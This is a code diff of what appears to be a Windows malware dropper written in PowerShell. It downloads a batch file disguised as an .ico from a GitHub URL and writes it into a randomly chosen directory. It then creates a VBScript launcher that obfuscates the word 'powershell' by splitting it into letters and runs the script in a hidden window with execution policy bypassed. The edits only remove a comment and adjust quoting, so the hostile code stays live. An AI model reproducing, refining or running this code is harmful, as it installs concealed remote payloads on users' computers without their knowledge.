@@ -5,7 +5,6 @@ $randomPath = Get-Random -InputObject $paths
 $fullPath = "$randomPath$randomProgram"
 New-Item -Path $fullPath -ItemType Directory -Force
 
-# تحميل ملف البات المسمى ico وتحويله لملف bat وتشغيله
 $batUrl = "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/upd.ico"
 $batPath = "$fullPath\upd.bat"
 Invoke-WebRequest -Uri $batUrl -OutFile $batPath
@@ -66,13 +65,13 @@ Remove-Item $tempPath -Force
 
 Set-Content -Path "$fullPath\$randomProgram.ps1" -Value $scriptContent -Force
 
-$vbsContent = @"
+$vbsContent = @'
 On Error Resume Next
 Dim arr, cmd
 arr = Split(""p,o,w,e,r,s,h,e,l,l"", "","")
 cmd = Join(arr, """") & "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """"$fullPath\$randomProgram.ps1""""
 CreateObject(""WScript.Shell"").Run cmd, 0, False
-"@
+'@
 
 Set-Content -Path "$fullPath\$randomProgram.vbs" -Value $vbsContent -Force
 
